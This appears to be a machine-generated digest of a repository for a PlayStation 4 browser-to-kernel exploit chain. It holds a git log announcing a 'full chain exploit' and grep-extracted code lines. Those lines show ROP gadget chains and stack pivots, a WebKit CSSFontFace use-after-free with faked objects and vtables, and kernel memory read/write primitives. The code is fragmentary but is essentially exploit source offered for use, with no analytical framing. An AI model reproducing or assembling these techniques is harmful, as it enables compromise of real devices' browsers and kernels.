@@ -1,0 +1,148 @@
+## git
+0d0cce9 2026-08-05 update README.md
+98c3380 2026-07-27 typo
+ebd5534 2026-07-27 Merge branch 'main' of https://github.com/ufm42/wobkot
+5b0fc3e 2026-07-27 cleanup
+f05f77e 2026-07-26 Add LICENSE.md
+2a254c6 2026-07-26 fix issue with lapse
+2f96abf 2026-07-26 full chain exploit added
+bba4e8f 2026-07-03 update rop implementation for gadgets compatibility
+f0ab54d 2026-07-01 add 10.xx support
+d4b1c31 2026-07-01 Merge branch 'main' of https://github.com/ufm42/wobkot
+bfd5246 2026-07-01 - redesign offsets to an Proxy obj in utils.js - update implementation to reduce unnecessary spray in userland.js - add formatting rules - fix host.py print after server runs which will never show
+d44e618 2026-06-24 Update README.md
+bfe1f02 2026-06-24 Add AlAzif to special thanks section
+8570850 2026-06-24 Update README with CSSFontFace-Exploit reference
+7aef78a 2026-06-24 Create README with usage and credits
+6108c05 2026-06-24 initial commit
+## files
+./public/src/lapse.js
+./public/src/netctrl.js
+./public/src/ps4/kernel.js
+## symbols
+./public/backup/threads_old.js:58:    this.pivot_frame = new Frame(["jmp_rax", "rsp"]);
+./public/backup/threads_old.js:59:    this.pivot_stack = new Stack(0x1000);
+./public/backup/threads_old.js:60:    this.pivot_pivot = new Pivot();
+./public/backup/threads_old.js:62:    this.pivot_insts = [];
+./public/backup/threads_old.js:63:    this.pivot_insts.push(gadgets.POP_RAX_RET);
+./public/backup/threads_old.js:64:    this.pivot_insts.push("jmp_rax");
+./public/backup/threads_old.js:65:    this.pivot_insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);
+./public/backup/threads_old.js:67:    this.pivot_frame.store(this.pivot_insts, "rsp");
+./public/backup/threads_old.js:69:    fn.pthread_mutex_lock.chain(this.pivot_insts, this.mutex_addr);
+./public/backup/threads_old.js:70:    fn.pthread_cond_wait.chain(this.pivot_insts, this.cond_addr, this.mutex_addr);
+./public/backup/threads_old.js:71:    fn.pthread_mutex_unlock.chain(this.pivot_insts, this.mutex_addr);
+./public/backup/threads_old.js:73:    this.pivot_frame.load(this.pivot_insts, "rsp");
+./public/backup/threads_old.js:74:    this.pivot_insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
+./public/backup/threads_old.js:75:    this.pivot_insts.push(gadgets.POP_RAX_RET);
+./public/backup/threads_old.js:76:    this.pivot_insts.push(0);
+./public/backup/threads_old.js:77:    this.pivot_insts.push(gadgets.LEAVE_RET);
+./public/backup/threads_old.js:111:    this.pivot_frame.reset();
+./public/backup/threads_old.js:112:    this.pivot_stack.reset();
+./public/backup/threads_old.js:135:    this.pivot_frame.set_value("rsp", new_sp);
+./public/backup/threads_old.js:160:    this.pivot_frame.set_value("jmp_rax", gadgets.POP_RAX_RET);
+./public/backup/threads_old.js:162:    this.pivot_stack.prepare(this.pivot_insts, this.pivot_frame);
+./public/backup/threads_old.js:163:    this.pivot_pivot.prepare(this.pivot_stack.sp);
+./public/backup/threads_old.js:167:    const pivot_store_addr = mem.alloc(8);
+./public/backup/threads_old.js:169:    const pivot_addr = this.pivot_pivot.addr;
+./public/backup/threads_old.js:170:    arw.view(pivot_store_addr).setBInt(0, pivot_addr, true);
+./public/backup/threads_old.js:172:    if (fn.pthread_create.invoke(pthread_addr_addr, this.attr_addr, gadgets.MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX, pivot_store_addr)) {
+./public/backup/threads_old.js:184:    mem.free(pivot_store_addr);
+./public/backup/threads_old.js:354:    const pivot_stack_addr = pthread_stack_addr.add(pthread_stack_size.sub(0x4d8));
+./public/backup/threads_old.js:355:    logger.debug(`pivot_stack_addr: ${pivot_stack_addr}`);
+./public/backup/threads_old.js:357:    const old_return_addr = arw.view(pivot_stack_addr).getBInt(0, true);
+./public/backup/threads_old.js:360:    const old_local_addr = arw.view(pivot_stack_addr).getBInt(8, true);
+./public/backup/threads_old.js:363:    const pivot_insts = [];
+./public/backup/threads_old.js:364:    const pivot_stack = new Stack(0x1000);
+./public/backup/threads_old.js:368:    fn.setjmp.chain(pivot_insts, jmp_context);
+./public/backup/threads_old.js:371:      pivot_insts.push(inst);
+./public/backup/threads_old.js:374:    pivot_insts.push(gadgets.POP_RAX_RET);
+./public/backup/threads_old.js:375:    pivot_insts.push(old_return_addr);
+./public/backup/threads_old.js:376:    pivot_insts.push(gadgets.POP_RDI_RET);
+./public/backup/threads_old.js:377:    pivot_insts.push(jmp_context);
+./public/backup/threads_old.js:378:    pivot_insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+./public/backup/threads_old.js:380:    pivot_insts.push(gadgets.POP_RAX_RET);
+./public/backup/threads_old.js:381:    pivot_insts.push(pivot_stack_addr);
+./public/backup/threads_old.js:382:    pivot_insts.push(gadgets.POP_RDI_RET);
+./public/backup/threads_old.js:383:    pivot_insts.push(jmp_context.add(0x10));
+./public/backup/threads_old.js:384:    pivot_insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+./public/backup/threads_old.js:386:    pivot_insts.push(gadgets.POP_RAX_RET);
+./public/backup/threads_old.js:387:    pivot_insts.push(old_local_addr);
+./public/backup/threads_old.js:388:    pivot_insts.push(gadgets.POP_RDI_RET);
+./public/backup/threads_old.js:389:    pivot_insts.push(pivot_stack_addr.add(8));
+./public/backup/threads_old.js:390:    pivot_insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+./public/backup/threads_old.js:392:    fn.longjmp.chain(pivot_insts, jmp_context);
+./public/backup/threads_old.js:394:    pivot_stack.prepare(pivot_insts, frame);
+./public/backup/threads_old.js:396:    const stack_sp = pivot_stack.sp;
+./public/backup/threads_old.js:398:    arw.view(pivot_stack_addr).setBInt(0, gadgets.POP_RSP_RET, true);
+./public/backup/threads_old.js:399:    arw.view(pivot_stack_addr).setBInt(8, stack_sp, true);
+./public/src/lapse.js:1071:  function kread8(addr) {
+./public/src/lapse.js:1104:  kread8(evf_cv_addr);
+./public/src/lapse.js:1115:  const p = kread8(aio_info_addr.add(8));
+./public/src/lapse.js:1123:  const p_pid = kread8(p.add(0xb0));
+./public/src/lapse.js:1133:  const p_fd = kread8(p.add(0x48));
+./public/src/lapse.js:1136:  fdt_ofiles = kread8(p_fd);
+./public/src/lapse.js:1139:  const master_pipe_fp = kread8(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+./public/src/lapse.js:1142:  const slave_pipe_fp = kread8(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
+./public/src/lapse.js:1145:  const master_pipe_f_data = kread8(master_pipe_fp);
+./public/src/lapse.js:1148:  const slave_pipe_f_data = kread8(slave_pipe_fp);
+./public/src/netctrl.js:627:async function kread_slow(addr, size) {
+./public/src/netctrl.js:809:    throw new Error(`Unable to kread ${addr} !!`);
+./public/src/netctrl.js:815:async function kwrite_slow(dst, src, size) {
+./public/src/netctrl.js:960:async function kread8_slow(addr) {
+./public/src/netctrl.js:961:  const leak_buf = await kread_slow(addr, 8);
+./public/src/netctrl.js:996:  fdt_ofiles = await kread8_slow(kq_fdp);
+./public/src/netctrl.js:999:  const master_pipe_fp = await kread8_slow(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+./public/src/netctrl.js:1002:  const slave_pipe_fp = await kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
+./public/src/netctrl.js:1005:  const master_pipe_f_data = await kread8_slow(master_pipe_fp);
+./public/src/netctrl.js:1008:  const slave_pipe_f_data = await kread8_slow(slave_pipe_fp);
+./public/src/netctrl.js:1019:  await kwrite_slow(master_pipe_f_data, pipe_buf.addr, pipebuf.sizeof);
+./public/src/ps4/constants.js:28:      pivot_view_sp: 0x10,
+./public/src/ps4/constants.js:103:      pivot_view_sp: 0x18,
+./public/src/ps4/kernel.js:150:  kread(dst, src, size) {
+./public/src/ps4/kernel.js:163:  kwrite(dst, src, size) {
+./public/src/ps4/kernel.js:179:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);
+./public/src/ps4/kernel.js:185:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);
+./public/src/ps4/kernel.js:193:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);
+./public/src/ps4/kernel.js:201:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);
+./public/src/ps4/kernel.js:209:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);
+./public/src/ps4/kernel.js:217:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);
+./public/src/ps4/kernel.js:225:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);
+./public/src/ps4/kernel.js:233:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);
+./public/src/ps4/kernel.js:239:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);
+./public/src/ps4/kernel.js:248:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
+./public/src/ps4/kernel.js:252:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
+./public/src/ps4/kernel.js:259:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
+./public/src/ps4/kernel.js:266:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
+./public/src/ps4/kernel.js:273:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
+./public/src/ps4/kernel.js:280:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
+./public/src/ps4/kernel.js:287:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
+./public/src/ps4/kernel.js:294:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
+./public/src/ps4/kernel.js:300:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
+./public/src/ps4/userland.js:100:  pivot: undefined,
+./public/src/ps4/userland.js:110:    this.pivot.prepare(this.stack.sp);
+./public/src/ps4/userland.js:112:    const pivot_obj = {};
+./public/src/ps4/userland.js:113:    const pivot_obj_addr = arw.addrof(pivot_obj);
+./public/src/ps4/userland.js:115:    const empty_jscell = arw.view(pivot_obj_addr).getBInt(0, true);
+./public/src/ps4/userland.js:117:    const pivot_addr = this.pivot.addr;
+./public/src/ps4/userland.js:118:    arw.view(pivot_obj_addr).setBInt(0, pivot_addr, true);
+./public/src/ps4/userland.js:120:    Math.expm1(pivot_obj);
+./public/src/ps4/userland.js:122:    arw.view(pivot_obj_addr).setBInt(0, empty_jscell, true);
+./public/src/ps4/userland.js:304:    this.pivot_view = new DataView(new ArrayBuffer(0x28));
+./public/src/ps4/userland.js:311:      this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);
+./public/src/ps4/userland.js:312:      this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);
+./public/src/ps4/userland.js:314:      this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);
+./public/src/ps4/userland.js:315:      this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
+./public/src/ps4/userland.js:324:    this.store_view.setBInt(8, this.pivot_view.buffer.data(), true);
+./public/src/ps4/userland.js:326:    this.pivot_view.setBInt(0, this.pivot_view.buffer.data(), true);
+./public/src/ps4/userland.js:327:    this.pivot_view.setBInt(constants.pivot_view_sp, sp, true);
+./public/src/ps4/userland.js:1095:    const fake_obj_m_vector = rw.read8(fake_obj_addr.add(0x10));
+./public/src/ps4/userland.js:1096:    const fake_vtable_m_vector = rw.read8(fake_vtable_addr.add(0x10));
+./public/src/ps4/userland.js:1117:    fake_obj.setBInt(0, fake_vtable_m_vector, true);
+./public/src/ps4/userland.js:1135:    uaf_view.setBInt(constants.wk_CSSFontFace_m_function, fake_obj_m_vector, true); // m_function
+./public/src/ps4/userland.js:1211:  let m_function_pivot;
+./public/src/ps4/userland.js:1214:    m_function_pivot = g_NativeCodePoison.xor(gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120);
+./public/src/ps4/userland.js:1216:    m_function_pivot = gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40;
+./public/src/ps4/userland.js:1218:    m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;
+./public/src/ps4/userland.js:1221:  arw.view(m_executableOrRareData).setBInt(constants.wk_JSFunction_m_function, m_function_pivot, true);
+./public/src/ps4/userland.js:1223:  rop.pivot = new Pivot();
+./public/src/ps4/userland.js:1284:  fn.dlsym = new NativeFunction(0x24f, "number");
